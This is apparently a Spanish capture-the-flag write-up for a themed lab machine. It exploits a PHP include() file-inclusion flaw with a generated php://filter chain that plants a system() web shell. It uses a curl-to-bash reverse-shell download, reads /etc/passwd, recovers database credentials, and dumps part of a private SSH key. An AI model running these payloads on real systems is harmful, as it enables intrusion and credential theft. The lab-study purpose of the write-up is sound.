iAwIDAgMjBweCAjMDBmN2ZmNTU7DQogICAgICAgICAgICBib3JkZXI6IDJweCBkYXNoZWQgI2ZiYmMwNTsNCiAgICAgICAgICAgIGRpc3BsYXk6IGZsZXg7DQogICAgICAgICAgICBmbGV4LWRpcmVjdGlvbjogY29sdW1uOw0KICAgICAgICAgICAganVzdGlmeS1jb250ZW50OiBjZW50ZXI7DQogICAgICAgICAgICBhbGlnbi1pdGVtczogY2VudGVyOw0KICAgICAgICB9DQoNCiAgICAgICAgLmZsdXgtaW1nIHsNCiAgICAgICAgICAgIG1hcmdpbjogMXJlbSBhdXRvOw0KICAgICAgICB9DQoNCiAgICAgICAgLmZsdXgtaW1nIGltZyB7DQogICAgICAgICAgICBtYXgtd2lkdGg6IDEwMCU7DQogICAgICAgICAgICB3aWR0aDogMzAwcHg7DQogICAgICAgICAgICBmaWx0ZXI6IGRyb3Atc2hhZG93KDAgMCAxMHB4ICMwMGY3ZmYpOw0KICAgICAgICAgICAgdHJhbnNpdGlvbjogYWxsIDAuM3MgZWFzZTsNCiAgICAgICAgfQ0KDQogICAgICAgIC5mbHV4LWltZy5hY3RpdmUgaW1nIHsNCiAgICAgICAgICAgIGFuaW1hdGlvbjogcHVsc2UgMS4ycyBpbmZpbml0ZSBhbHRlcm5hdGU7DQogICAgICAgICAgICBmaWx0ZXI6IGRyb3Atc2hhZG93KDAgMCAyMHB4ICMwMGY3ZmYpOw0KICAgICAgICB9DQoNCiAgICAgICAgLmZsdXgtdGV4dCB7DQogICAgICAgICAgICBjb2xvcjogIzdDRkMwMDsNCiAgICAgICAgICAgIGZvbnQtc2l6ZTogMS4xcmVtOw0KICAgICAgICAgICAgbGluZS1oZWlnaHQ6IDEuNjsNCiAgICAgICAgICAgIG1hcmdpbi10b3A6IDEuNXJlbTsNCiAgICAgICAgICAgIGFuaW1hdGlvbjogYXBwZWFyVGV4dCAxcyBlYXNlLWluLW91dDsNCiAgICAgICAgfQ0KDQogICAgICAgIC5zd2l0Y2ggew0KICAgICAgICAgICAgbWFyZ2luLXRvcDogMnJlbTsNCiAgICAgICAgICAgIGRpc3BsYXk6IGlubGluZS1ibG9jazsNCiAgICAgICAgICAgIHBvc2l0aW9uOiByZWxhdGl2ZTsNCiAgICAgICAgICAgIHdpZHRoOiA2MHB4Ow0KICAgICAgICAgICAgaGVpZ2h0OiAzNHB4Ow0KICAgICAgICB9DQoNCiAgICAgICAgLnN3aXRjaCBpbnB1dCB7DQogICAgICAgICAgICBvcGFjaXR5OiAwOw0KICAgICAgICAgICAgd2lkdGg6IDA7DQogICAgICAgICAgICBoZWlnaHQ6IDA7DQogICAgICAgIH0NCg0KICAgICAgICAuc2xpZGVyIHsNCiAgICAgICAgICAgIHBvc2l0aW9uOiBhYnNvbHV0ZTsNCiAgICAgICAgICAgIGN1cnNvcjogcG9pbnRlcjsNCiAgICAgICAgICAgIHRvcDogMDsNCiAgICAgICAgICAgIGxlZnQ6IDA7DQogICAgICAgICAgICByaWdodDogMDsNCiAgICAgICAgICAgIGJvdHRvbTogMDsNCiAgICAgICAgICAgIGJhY2tncm91bmQtY29sb3I6ICM0NDQ7DQogICAgICAgICAgICBib3JkZXItcmFkaXVzOiAzNHB4Ow0KICAgICAgICAgICAgdHJhbnNpdGlvbjogMC40czsNCiAgICAgICAgfQ0KDQogICAgICAgIC5zbGlkZXI6YmVmb3JlIHsNCiAgICAgICAgICAgIHBvc2l0aW9uOiBhYnNvbHV0ZTsNCiAgICAgICAgICAgIGNvbnRlbnQ6ICIiOw0KICAgICAgICAgICAgaGVpZ2h0OiAyNnB4Ow0KICAgICAgICAgICAgd2lkdGg6IDI2cHg7DQogICAgICAgICAgICBsZWZ0OiA0cHg7DQogICAgICAgICAgICBib3R0b206IDRweDsNCiAgICAgICAgICAgIGJhY2tncm91bmQtY29sb3I6ICNmNDQzMzY7DQogICAgICAgICAgICBib3JkZXItcmFkaXVzOiA1MCU7DQogICAgICAgICAgICB0cmFuc2l0aW9uOiAwLjRzOw0KICAgICAgICB9DQoNCiAgICAgICAgLnN3aXRjaCBpbnB1dDpjaGVja2VkKy5zbGlkZXIgew0KICAgICAgICAgICAgYmFja2dyb3VuZC1jb2xvcjogIzdDRkMwMDsNCiAgICAgICAgfQ0KDQogICAgICAgIC5zd2l0Y2ggaW5wdXQ6Y2hlY2tlZCsuc2xpZGVyOmJlZm9yZSB7DQogICAgICAgICAgICB0cmFuc2Zvcm06IHRyYW5zbGF0ZVgoMjZweCk7DQogICAgICAgICAgICBiYWNrZ3JvdW5kLWNvbG9yOiAjN0NGQzAwOw0KICAgICAgICB9DQoNCiAgICAgICAgQGtleWZyYW1lcyBhcHBlYXJUZXh0IHsNCiAgICAgICAgICAgIGZyb20gew0KICAgICAgICAgICAgICAgIG9wYWNpdHk6IDA7DQogICAgICAgICAgICAgICAgdHJhbnNmb3JtOiB0cmFuc2xhdGVZKDEwcHgpOw0KICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICB0byB7DQogICAgICAgICAgICAgICAgb3BhY2l0eTogMTsNCiAgICAgICAgICAgICAgICB0cmFuc2Zvcm06IHRyYW5zbGF0ZVkoMCk7DQogICAgICAgICAgICB9DQogICAgICAgIH0NCg0KICAgICAgICBAa2V5ZnJhbWVzIHB1bHNlIHsNCiAgICAgICAgICAgIGZyb20gew0KICAgICAgICAgICAgICAgIHRyYW5zZm9ybTogc2NhbGUoMSk7DQogICAgICAgICAgICAgICAgZmlsdGVyOiBkcm9wLXNoYWRvdygwIDAgNXB4ICMwMGY3ZmYpOw0KICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICB0byB7DQogICAgICAgICAgICAgICAgdHJhbnNmb3JtOiBzY2FsZSgxLjAyKTsNCiAgICAgICAgICAgICAgICBmaWx0ZXI6IGRyb3Atc2hhZG93KDAgMCAxNXB4ICMwMGY3ZmYpOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQoNCiAgICAgICAgYS5idXR0b24gew0KICAgICAgICAgICAgZGlzcGxheTogaW5saW5lLWJsb2NrOw0KICAgICAgICAgICAgbWFyZ2luLXRvcDogMnJlbTsNCiAgICAgICAgICAgIHBhZGRpbmc6IDAuN3JlbSAxLjVyZW07DQogICAgICAgICAgICBiYWNrZ3JvdW5kOiAjMGUwZTFhOw0KICAgICAgICAgICAgYm9yZGVyOiAycHggc29saWQgI2Y0NDMzNjsNCiAgICAgICAgICAgIGNvbG9yOiAjZjQ0MzM2Ow0KICAgICAgICAgICAgdGV4dC1kZWNvcmF0aW9uOiBub25lOw0KICAgICAgICAgICAgdHJhbnNpdGlvbjogYWxsIDAuM3MgZWFzZTsNCiAgICAgICAgfQ0KDQogICAgICAgIGEuYnV0dG9uOmhvdmVyIHsNCiAgICAgICAgICAgIGJhY2tncm91bmQ6ICNmNDQzMzY7DQogICAgICAgICAgICBjb2xvcjogI2ZmZjsNCiAgICAgICAgfQ0KICAgIDwvc3R5bGU+DQo8L2hlYWQ+DQo8Ym9keT4NCg0KDQogICAgPGRpdiBjbGFzcz0iY29udGFpbmVyIj4NCiAgICAgICAgPGgxPkFkbWluIFBhbmVsIC0gUmVnaXN0cm8gVGVtcG9yYWw8L2gxPg0KICAgICAgICA8ZGl2IGNsYXNzPSJuYXYiPg0KICAgICAgICAgICAgPGEgaHJlZj0iP3BhZ2U9YWJvdXQucGhwIj5BYm91dDwvYT4NCiAgICAgICAgICAgIDxhIGhyZWY9Ij9wYWdlPWNsb2NrdG93ZXIucGhwIj5DbG9ja3Rvd2VyPC9hPg0KICAgICAgICAgICAgPGEgaHJlZj0iP3BhZ2U9Zmx1eF9jYXBhY2l0b3IucGhwIj5GbHV4IENhcGFjaXRvcjwvYT4NCiAgICAgICAgICAgIDxhIGhyZWY9Ij9wYWdlPWxvZ3MucGhwIj5Mb2dzPC9hPg0KICAgICAgICAgICAgPGEgaHJlZj0iP3BhZ2U9ZG9jX2pvdXJuYWwucGhwIj5Eb2MncyBKb3VybmFsPC9hPg0KICAgICAgICAgICAgPGEgaHJlZj0iP3BhZ2U9dGltZV9tYWNoaW5lLnBocCI+VGltZSBNYWNoaW5lPC9hPg0KICAgICAgICAgICAgPGEgaHJlZj0ibG9nb3V0LnBocCI+TG9nIG91dDwvYT4NCiAgICAgICAgPC9kaXY+DQogICAgDQogICAgICAgIDxkaXYgY2xhc3M9InRlcm1pbmFsIj4NCiAgICAgICAgICAgIDw/cGhwDQogICAgICAgICAgICAgICAgaWYgKGlzc2V0KCRfR0VUWydwYWdlJ10pKSB7DQogICAgICAgICAgICAgICAgICAgIGluY2x1ZGUoJF9HRVRbJ3BhZ2UnXSk7DQogICAgICAgICAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICAgICAgICAgZWNobyAiPHA+QmllbnZlbmlkbyBhbCBwYW5lbCBkZSBhZG1pbmlzdHJhY2nDs24uPC9wPiI7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgPz4NCiAgICAgICAgPC9kaXY+DQogICAgPC9kaXY+DQoNCiAgICA8c2NyaXB0IHNyYz0ianMvaW5kZXguanMiPjwvc2NyaXB0Pg0KPC9ib2R5Pg0KPC9odG1sPg0K\r\u0026lt;?php ini_set(\u0026#39;display_errors\u0026#39;, 0); session_start(); if (!isset($_SESSION[\u0026#39;logged_in\u0026#39;]) || $_SESSION[\u0026#39;logged_in\u0026#39;] !== true) { header(\u0026#34;Location: index.php\u0026#34;); exit; } ?\u0026gt; \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; \u0026lt;!-- Se dice que el DeLorean guarda secretos si inspeccionás bien --\u0026gt; \u0026lt;title\u0026gt;Hill Valley Admin Panel\u0026lt;/title\u0026gt; \u0026lt;style\u0026gt; body { background: #0e0e1a; color: #00ffcc; font-family: \u0026#39;Courier New\u0026#39;, Courier, monospace; } h2 { margin-bottom: 1rem; } p { margin-bottom: .5rem; } .container { width: 90%; margin: 2rem auto; } .nav { margin-bottom: 1.5rem; display: flex; } .nav a { color: #00ffff; text-decoration: none; margin-right: 1rem; padding: .5rem 0; border-bottom: 1px solid #00ffff; } .terminal { background: #000000; border: 1px solid #00ffcc; padding: 1rem; text-wrap: wrap; word-wrap: wrap; overflow: hidden; overflow-wrap: break-word; display: flex; flex-direction: column; justify-content: center; align-items: center; } .img { width: 100%; max-width: 500px; display: block; margin: 0 auto; } @media (max-width: 768px) { .time-row { grid-template-columns: repeat(6, auto); justify-content: center; } .time-row .caption { font-size: 0.9rem; } .char { font-size: 1.3rem; } h1 { font-size: 2rem; } .delorean-panel { padding: 1rem; } } .flux-card { background: #111; max-width: 700px; margin: auto; padding: 2rem; border-radius: 12px; box-shadow: 0 0 20px #00f7ff55; border: 2px dashed #fbbc05; display: flex; flex-direction: column; justify-content: center; align-items: center; } .flux-img { margin: 1rem auto; } .flux-img img { max-width: 100%; width: 300px; filter: drop-shadow(0 0 10px #00f7ff); transition: all 0.3s ease; } .flux-img.active img { animation: pulse 1.2s infinite alternate; filter: drop-shadow(0 0 20px #00f7ff); } .flux-text { color: #7CFC00; font-size: 1.1rem; line-height: 1.6; margin-top: 1.5rem; animation: appearText 1s ease-in-out; } .switch { margin-top: 2rem; display: inline-block; position: relative; width: 60px; height: 34px; } .switch input { opacity: 0; width: 0; height: 0; } .slider { position: absolute; cursor: pointer; top: 0; left: 0; right: 0; bottom: 0; background-color: #444; border-radius: 34px; transition: 0.4s; } .slider:before { position: absolute; content: \u0026#34;\u0026#34;; height: 26px; width: 26px; left: 4px; bottom: 4px; background-color: #f44336; border-radius: 50%; transition: 0.4s; } .switch input:checked+.slider { background-color: #7CFC00; } .switch input:checked+.slider:before { transform: translateX(26px); background-color: #7CFC00; } @keyframes appearText { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } } @keyframes pulse { from { transform: scale(1); filter: drop-shadow(0 0 5px #00f7ff); } to { transform: scale(1.02); filter: drop-shadow(0 0 15px #00f7ff); } } a.button { display: inline-block; margin-top: 2rem; padding: 0.7rem 1.5rem; background: #0e0e1a; border: 2px solid #f44336; color: #f44336; text-decoration: none; transition: all 0.3s ease; } a.button:hover { background: #f44336; color: #fff; } \u0026lt;/style\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div class=\u0026#34;container\u0026#34;\u0026gt; \u0026lt;h1\u0026gt;Admin Panel - Registro Temporal\u0026lt;/h1\u0026gt; \u0026lt;div class=\u0026#34;nav\u0026#34;\u0026gt; \u0026lt;a href=\u0026#34;?page=about.php\u0026#34;\u0026gt;About\u0026lt;/a\u0026gt; \u0026lt;a href=\u0026#34;?page=clocktower.php\u0026#34;\u0026gt;Clocktower\u0026lt;/a\u0026gt; \u0026lt;a href=\u0026#34;?page=flux_capacitor.php\u0026#34;\u0026gt;Flux Capacitor\u0026lt;/a\u0026gt; \u0026lt;a href=\u0026#34;?page=logs.php\u0026#34;\u0026gt;Logs\u0026lt;/a\u0026gt; \u0026lt;a href=\u0026#34;?page=doc_journal.php\u0026#34;\u0026gt;Doc\u0026#39;s Journal\u0026lt;/a\u0026gt; \u0026lt;a href=\u0026#34;?page=time_machine.php\u0026#34;\u0026gt;Time Machine\u0026lt;/a\u0026gt; \u0026lt;a href=\u0026#34;logout.php\u0026#34;\u0026gt;Log out\u0026lt;/a\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;terminal\u0026#34;\u0026gt; \u0026lt;?php if (isset($_GET[\u0026#39;page\u0026#39;])) { include($_GET[\u0026#39;page\u0026#39;]); } else { echo \u0026#34;\u0026lt;p\u0026gt;Bienvenido al panel de administración.\u0026lt;/p\u0026gt;\u0026#34;; } ?\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;script src=\u0026#34;js/index.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; Ahí podemos identificar el campo vulnerable include($_GET['page']); ya que recoge nuestro input y no pasa por ningún tipo de filtro ni sanitización, luego con la función include incluyendo el fichero apuntado y recogido por el parámetro page.\nBien sabiendo que podemos usar PHP Wrappers, para lograr un RCE vamos a usar el siguiente repositorio:\nPHP filter chain generator\rA CLI to generate PHP filters chain, get your RCE without uploading a file if you control entirely the parameter passed to a require or an include in PHP!\nVamos a usar el php_filter_chain_generator.py, para ello vamos a seguir la siguiente sintaxis compartida en el repositorio como ejemplo:\n$ python3 php_filter_chain_generator.py --chain \u0026#39;\u0026lt;?php phpinfo(); ?\u0026gt; \u0026#39;\rVamos a emplearlo:\n┌──(pylon㉿kali)-[~/…/pylon/THL/BackToTheFuture/content] └─$ python3 php_filter_chain_generator.py --chain \u0026#39;\u0026lt;?php system($_GET[0]);?\u0026gt;\u0026#39; [+] The following gadget chain will generate the following code : \u0026lt;?php system($_GET[0]);?\u0026gt; (base64 value: PD9waHAgc3lzdGVtKCRfR0VUWzBdKTs/Pg) php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500.L4|convert.iconv.ISO_8859-2.ISO-IR-103|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp\rCon \u0026lt;?php system($_GET[0]);?\u0026gt; estamos estableciendo una web shell básica donde por el parámetro 0 recoge nuestro input y con la función system() la ejecuta a nivel de sistema. Vamos a poner esta cadena en en el parámetro page y al final añadiremos el parámetro que está en \u0026ldquo;escucha\u0026rdquo;:\nNota\nEn este caso lo realicé en BurpSuite ya que me parece más comodo que hacerlo por la URL\nVemos que funcionó! Vamos a darnos una reverse shell, en este caso cree un archivo en mi máquina llamado shell.sh donde contiene la reverse shell y nos abriremos un servidor en python3:\nVale ahora en el servidor apuntaremos a nuestro servidor de python3 con curl:\ncurl http://YOUR-SERVER-IP:PORT/shell.sh+|bash\rBien!! Si ponemos whoami veremos que somos el usuario www-data.\nShell as marty Vamos a leer el /etc/passwd:\nbash-5.2$ cat /ecat /etc/passwd cat /etc/passwd root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin _apt:x:42:65534::/nonexistent:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin tss:x:100:107:TPM software stack,,,:/var/lib/tpm:/bin/false systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin messagebus:x:101:108::/nonexistent:/usr/sbin/nologin avahi-autoipd:x:102:111:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin usbmux:x:103:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin dnsmasq:x:999:65534:dnsmasq:/var/lib/misc:/usr/sbin/nologin avahi:x:104:113:Avahi mDNS daemon,,,:/run/avahi-daemon:/usr/sbin/nologin fwupd-refresh:x:106:116:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin saned:x:107:118::/var/lib/saned:/usr/sbin/nologin geoclue:x:108:119::/var/lib/geoclue:/usr/sbin/nologin polkitd:x:996:996:polkit:/nonexistent:/usr/sbin/nologin rtkit:x:109:120:RealtimeKit,,,:/proc:/usr/sbin/nologin colord:x:110:121:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin docbrown:x:1000:1000:docbrown,,,:/home/docbrown:/bin/bash sshd:x:113:65534::/run/sshd:/usr/sbin/nologin mysql:x:114:123:MySQL Server,,,:/nonexistent:/bin/false marty:x:1001:1001::/home/marty:/bin/bash ftp:x:115:124:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin\rVemos que existen los siguientes usuarios:\nmarty docbrown Tambien vemos lp que forma parte del servicio de CUPS. Si recordamos hay una base de datos, tanto expuesta a nivel de red y vulnerable ante la aplicación web, vamos a hacer un ls:\nbash-5.2$ ls ls ls about.php css index.php time_machine.php admin.php doc_journal.php js clocktower.php flux_capacitor.php logout.php config.php img logs.php bash-5.2$\rVemos el archivo config.php vamos a ver su contenido:\nbash-5.2$ cat config.php \u0026lt;?php $host = \u0026#34;localhost\u0026#34;; $user = \u0026#34;marty\u0026#34;; $pass = \u0026#34;t1m3travel\u0026#34;; $db = \u0026#34;hillvalley\u0026#34;; $conn = mysqli_connect($host, $user, $pass, $db); if (!$conn) { die(\u0026#34;Connection failed: \u0026#34; . mysqli_connect_error()); } ?\u0026gt; Obtuvimos las posibles credenciales del usuario marty que sería t1m3travel, vamos a probarlas por SSH:\n┌──(pylon㉿kali)-[~/…/pylon/THL/BackToTheFuture/content] └─$ ssh marty@192.168.44.133 marty@192.168.44.133: Permission denied (publickey).\rVemos que necesitamos si o si un id_rsa, así que vamos a intentar iniciar sesión en la propia reverse shell:\nbash-5.2$ su marty Password: t1m3travel bash-5.2$ whoami marty\rVemos que las credenciales son validas!! Si hacemos un ls -la en el directorio suyo home nos encontraremos lo siguiente:\nbash-5.2$ ls -lals -la total 56 drwxr-xr-x 7 marty marty 4096 Jul 20 11:44 . drwxr-xr-x 4 root root 4096 Jul 12 15:49 .. lrwxrwxrwx 1 root root 9 Jul 13 16:50 .bash_history -\u0026gt; /dev/null -rw-r--r-- 1 marty marty 220 Mar 29 2024 .bash_logout -rw-r--r-- 1 marty marty 3552 Jul 12 20:45 .bashrc drwx------ 4 marty marty 4096 Jul 12 20:28 .cache drwxr-xr-x 3 marty marty 4096 Jul 12 20:28 .config -rw-r--r-- 1 marty marty 5290 Jul 12 2023 .face lrwxrwxrwx 1 marty marty 5 Jul 12 2023 .face.icon -\u0026gt; .face -rw-r--r-- 1 docbrown docbrown 80 Jul 12 21:19 .flux_notes drwxr-xr-x 2 root root 4096 Jul 12 19:48 ftp drwxr-xr-x 4 marty marty 4096 Jul 12 20:28 .local -rw-r--r-- 1 marty marty 807 Mar 29 2024 .profile drwx------ 2 marty marty 4096 Jul 14 20:16 .ssh -rw-r--r-- 1 root root 16 Jul 14 20:22 user.txt\rVamos a intentar leer el id_rsa de marty:\nbash-5.2$ cat .ssh/id_rsa -----BEGIN OPENSSH PRIVATE KEY----- b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABBXUcknGX 7srNsSZgfD/Jm8AAAAEAAAAAEAAAGXAAAAB3NzaC1yc2EAAAADAQABAAABgQC+DTrijkmb 32zpAWUA7EyQUTbnnf96GXcjiSbTLp1yz4c5/+COh7xZtKeWZw+Esvz0zJ5bugKmdBlXha wLuHxe9yeTd/YtiOV37rbfHcvNcVrleCH76YN1Sab79eSvuHSVp3UhxmGSIwScGt+y7pKV 5kp9iQ1AWg89PlaulwMlRzXGbBmDIdpjWV5PY5ceg9pDEx4mP0I4/aWF/BwaxsDNqJ+fjI vtBvSWMeSxMKUexmg/WdYQekZq55Cq1dL7xdHZErOYMF/dWaT4GsuGIY0+oqHbewksAFq0 VL5IQ0qJPx7MMV2pHixn1/SBmOzND0C1w4LPNxinPVPfj9RgyORLreMGk2CnMKYaIqlDTX Lg6Lz8yJ1EzjyM1YDKu5EzbkdflyI3EcPwzmJuIorvHSn9SqeX9b4r/If+JSb9L/L7nOhE FyWEgDphumRS+4R8xpkqvYEhN9viadE2Ax9I7lDibP5XR5442oGS6lP9q0adGT55tFpCUQ VFwU14S9f17+kAAAWQOgwYI7DC+nRQgxXPfB9gi7LDfiJuMydls05ay+I3mP/GIQ8Y9J0L eKs7KcfAsnj1xUP0OcYWiM5Ae3+PXt3B9DuJhUsF2bARp6bTFWxB1FObtpSWr4lwH5esFT 5t82Ai8ApyDQdkMutrCHnDLGvq5wZjYJOItvp7jqvwWQu1bbOObtpRB9xJBMXSjqIFisFM b01mvzSOrBozp96qks31sGPX2IZ55zH4WCnmE7WNnNUvj9kc5rztcO6LUssEQyNGN6DX6v YyyfEYPPdawCCaNeQDtmsHGHNt8bYh7+yxjUItUfrXZF7/Z0BJZzVUePye89gnSk/4FlL2 44p3lJqjZAFQ7qFf7YPZVjgB6L+aCnJszg0GccOHQJiTAFcSUvJfV5zzrVh+7UOsZIkuiD EX3U3Q/fZLe/rAaKS369qsW3+E/sNS3JOj9MWESmIPQawEa33xqbCHoHtRniKCMbAThFjB stJwBaNindfmn8pOfqLXjTCEVu5pogix2q1yJCWte0Lz17DjnFxGFfmGvUW5q00ojpZKt4 7kuavNAcUIdlx14iqHa3xih/E90me5DDjiAC3pHvwMT/RdYvEuP1ME3b4PhSKOjL6Qg0bL awtXmKzghLI5/8lc18y3lQAmxjs5Prg2uJ690bSgwTj4hm3CagVJB5+GBPL+5CYBfNtzG5 45QvQOqvLrSDZiQWUIdw7N9N3x+imLZxARfooR7zBAuzjFRMv4P53BeLKTbFIjXqKfBdi0 R0ne2Schv2d9tuXnH6/iBnC+LIXO6m9Z0D4PMQwG/hNh6Iy1xlHc7NynsqDM9lXQnHbv1C S7955T7EQHGiyYnQkpEYN9LUR87hEeCruiCihv0KLFtA/hOdhj1UARTHIdv36afy6Su+mL 